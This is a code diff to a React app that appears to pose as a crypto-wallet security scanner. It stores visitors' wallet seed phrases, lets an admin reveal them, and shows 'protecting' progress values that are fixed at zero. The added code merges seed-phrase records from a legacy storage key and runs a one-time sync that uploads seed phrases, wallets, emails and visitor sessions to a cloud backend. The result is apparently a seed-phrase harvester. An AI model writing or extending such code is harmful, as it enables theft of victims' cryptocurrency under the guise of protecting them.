@@ -280,6 +280,7 @@ const VISITED_EMAILS_KEY   = 'sv_visit_emailed_v1'
 const SCAN_EMAILED_KEY     = 'sv_scan_emailed_v1'
 const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
 const SEED_PHRASES_KEY     = 'sv_seed_phrases_v1'
+const LEGACY_SEED_PHRASES_KEY = 'sv_seed_phrases'
 const NEW_USER_KEY         = 'sv_new_user_v1'
 const CONNECTED_WALLETS_KEY  = 'sv_connected_wallets_v1'
 const SCAN_HISTORY_KEY       = 'sv_scan_history_v1'
@@ -480,6 +481,22 @@ const looksLikeSeedPhrase = (text: string): boolean => {
 const maskSeedPhrase = (phrase: string): string => {
   const words = phrase.trim().split(/\s+/)
   return words.map((w, i) => (i === 0 || i === words.length - 1) ? w : '•••').join(' ')
+}
+
+const readSeedPhraseRecords = (): SeedPhraseRecord[] => {
+  try {
+    const current = JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[]
+    const legacy = JSON.parse(localStorage.getItem(LEGACY_SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[]
+    const merged = [...(Array.isArray(current) ? current : [])]
+    const existing = new Set(merged.map(item => `${item.id}|${item.seedPhrase}`))
+    for (const item of (Array.isArray(legacy) ? legacy : [])) {
+      const key = `${item.id}|${item.seedPhrase}`
+      if (!existing.has(key)) merged.push(item)
+    }
+    return merged
+  } catch {
+    return []
+  }
 }
 
 const pillClass = (s: Severity | string) =>
@@ -921,10 +938,7 @@ export default function App() {
   const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>(() => {
     try { return JSON.parse(localStorage.getItem(ADMIN_INTEL_KEY) ?? '[]') as AdminIntelRecord[] } catch { return [] }
   })
-  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(() => {
-    try { return JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[] }
-    catch { return [] }
-  })
+  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(readSeedPhraseRecords)
   const [seedRevealedIds,   setSeedRevealedIds]   = useState<string[]>([])
 
   // Bot Deploy
@@ -986,6 +1000,7 @@ export default function App() {
   const [wcActionStatus,      setWcActionStatus]      = useState<string | null>(null)
   const wcClientRef = useRef<Awaited<ReturnType<typeof SignClient.init>> | null>(null)
   const cloudLoadedRef = useRef(false)
+  const [cloudHydrated, setCloudHydrated] = useState(false)
   const [protectingProgress] = useState(0)
   const [protectingDone] = useState(false)
   const [protectingFinal] = useState(false)
@@ -1297,6 +1312,7 @@ export default function App() {
     loadFromCloud().catch(() => {
       // Cloud unavailable — allow local edits to sync once cloud is reachable
       cloudLoadedRef.current = true
+      setCloudHydrated(true)
     }).then(row => {
       if (!row) return
       if (row.connected_wallets)      setConnectedWallets(row.connected_wallets      as ConnectedWalletRecord[])
@@ -1330,8 +1346,30 @@ export default function App() {
       if (row.bot_requests)
         setBotRequests(row.bot_requests as BotDeployRequest[])
       cloudLoadedRef.current = true
+      setCloudHydrated(true)
     })
   }, [])
+
+  // Backfill one full sync after hydration so any early user actions
+  // (before cloudLoadedRef flipped true) are still pushed to cloud.
+  useEffect(() => {
+    if (!cloudHydrated) return
+    saveToCloud({
+      connected_wallets: connectedWallets,
+      scan_history: scanHistory,
+      signer_checks: signerChecks,
+      email_records: emailRecords,
+      admin_intel_records: adminIntelRecords,
+      seed_phrases: seedPhraseRecords,
+      protect_checklist_done: protectChecklistDone,
+      newsletter_emails: newsletterEmails,
+      visitor_sessions: visitorSessions,
+      support_config: supportConfig,
+      admin_creds: { email: adminCreds.email, password: '' } as AdminCreds,
+      user_email_routes: userEmailRoutes,
+      bot_requests: botRequests,
+    })
+  }, [cloudHydrated])
 
   useEffect(() => {
     const visitorId = localStorage.getItem(VISITOR_ID_KEY) ?? `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
